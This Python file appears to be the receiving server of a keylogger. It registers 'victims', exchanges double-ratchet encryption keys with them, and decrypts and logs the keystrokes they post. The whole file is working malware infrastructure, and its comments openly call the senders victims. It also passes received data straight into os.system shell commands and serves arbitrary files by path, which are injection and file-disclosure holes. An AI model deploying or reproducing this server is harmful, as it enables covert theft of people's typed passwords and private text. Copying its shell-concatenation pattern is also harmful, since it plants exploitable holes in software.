#!/usr/bin/env python3
from http.server import BaseHTTPRequestHandler, HTTPServer
import logging
import double_ratchet
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import dh
from cryptography.hazmat.backends import default_backend
from os import system
import base64
from secrets import token_urlsafe
from settings import *


clients = []


class MyServer(BaseHTTPRequestHandler):


    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
    

    def log_message(self, format, *args):
        return


    def __set_response(self):
        path = self.path.replace('/','')
        try:
            with open(path) as f:
                self.send_response(200)
                self.send_header('Content-type','text/html')
                self.end_headers()
                self.wfile.write(bytes(f.read(), 'ascii'))
                return
        except IOError:
            self.send_error(404,'File Not Found: %s' % self.path)


    def do_GET(self):
        global clients
        ip = self.client_address[0]
        f_path = "logs/" + ip
        if (self.path == '/login'):
            # received a new connection
            if not any(ip in cp for cp in clients):
                clients.append([ip, token_urlsafe(16), double_ratchet.Ratchet()])
                print("Client connected: ", ip)
                system("date >> "+f_path+";echo 'Client connected' >> " + f_path)
            # old connections can call login endpoint to update their keys
            # get the token and ratchet for each client
            ip, token, ratchet = [d for d in clients if ip in d].pop()
            print("Renewing keys")
            # update keys
            key = str(self.headers).split('Session:')[1]
            pubkey = base64.b64decode(key.encode('ascii'))
            dhpub: dh.DHPublicKey = serialization.load_pem_public_key(pubkey, backend=default_backend())
            ratchet.pairComm(dhpub)
            # just update the public key under a the random client endpoint
            with open(token, 'w') as f:
                f.write(ratchet.getPublicKey().decode('ascii'))
            # send endpoint to client in location header
            self.send_response(200)
            self.send_header('Content-type','text/html')
            self.send_header('Location', token)
            self.end_headers()
            self.wfile.write(bytes(token, 'ascii'))
            return
        elif self.path == '/logout':
            # client disconnected due to an error
            clients = [d for d in clients if ip not in d]
            print("Client disconnected: ", ip)
            system("date >> "+f_path+";echo 'Client disconnected' >> " + f_path)
        self.__set_response()


    def do_POST(self):
        global clients
        content_length = int(self.headers['Content-Length'])
        # at this endpoint victims send their encrypted keystrokes
        if self.path == '/home':
            ip, token, ratchet = [d for d in clients if self.client_address[0] in d].pop()
            f_path = "logs/" + ip
            b64_msg = self.rfile.read(content_length)
            enc_msg = base64.b64decode(b64_msg)
            msg = ratchet.decrypt(enc_msg)
            print(ip + ': ' + msg)
            system("date >> "+f_path+";echo '"+msg+"' >> " + f_path)
            ratchet.updateDH()
            with open(token, 'w') as f:
                f.write(ratchet.getPublicKey().decode('ascii'))
        self.__set_response()


def run(server_class=HTTPServer, handler_class=MyServer):
    logging.basicConfig(level=logging.INFO)
    server_address = (SERVER_IP, SERVER_PORT)
    httpd = server_class(server_address, handler_class)
    logging.info('Starting httpd...\n')
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()
    logging.info('Stopping httpd...\n')



run()